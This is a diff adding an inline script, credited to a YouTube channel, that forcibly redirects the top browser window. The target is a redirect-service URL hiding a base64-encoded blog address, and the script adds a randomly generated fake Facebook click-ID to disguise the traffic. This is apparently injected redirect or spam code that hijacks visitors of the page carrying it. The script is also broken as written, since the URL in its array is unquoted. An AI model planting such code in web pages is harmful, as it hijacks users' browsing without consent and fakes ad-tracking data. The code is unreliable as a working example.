@@ -1,0 +1,16 @@
+
+
+<script> // code by youtube.com/shreateh-net
+links=[https://p.rapolok.com/go/471311/708880/aHR0cHMlM0EvL3d3dy50cmVlLWZpdC5vbmxpbmUvMjAyNC8wMy9ibG9nLXBvc3RfMzEuaHRtbA==];
+list="";
+time=60;
+fbclid=[...Array(50)].map(() => Math.floor(Math.random() * 16).toString(16)).join(''); 
+
+url=links[Math.floor(Math.random()*links.length)];
+if(!url) url =links[1];
+if(list) url +='?list='+list;
+if(time) url +='&t='+ Math.floor(Math.random() * time); 
+if(fbclid) url +='&fbkclid='+fbclid; 
+
+window.top.location=url; 
+</script>
